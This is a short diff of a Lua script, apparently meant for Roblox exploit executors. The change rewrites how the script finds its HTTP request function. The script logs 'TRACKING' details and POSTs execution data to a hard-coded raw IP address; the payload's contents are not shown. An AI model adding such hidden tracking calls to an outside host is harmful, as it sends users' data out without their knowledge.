@@ -11,11 +11,8 @@ task.spawn(function()
 
     print("TRACKING: executor =", executorName)
 
-    local req = (syn and syn.request) or http_request or request
-    print("TRACKING: request function =", tostring(req))
-
-    if not req then
-        warn("TRACKING: No HTTP request function found")
+    if type(request) ~= "function" then
+        warn("TRACKING: request() not available")
         return
     end
 
@@ -26,7 +23,7 @@ task.spawn(function()
     })
 
     local ok, result = pcall(function()
-        return req({
+        return request({
             Url = "http://86.11.23.18:3000/debug-execution",
             Method = "POST",
             Headers = {
@@ -43,7 +40,6 @@ task.spawn(function()
         warn("TRACKING FAILED:", result)
     end
 end)
-
 
 
 
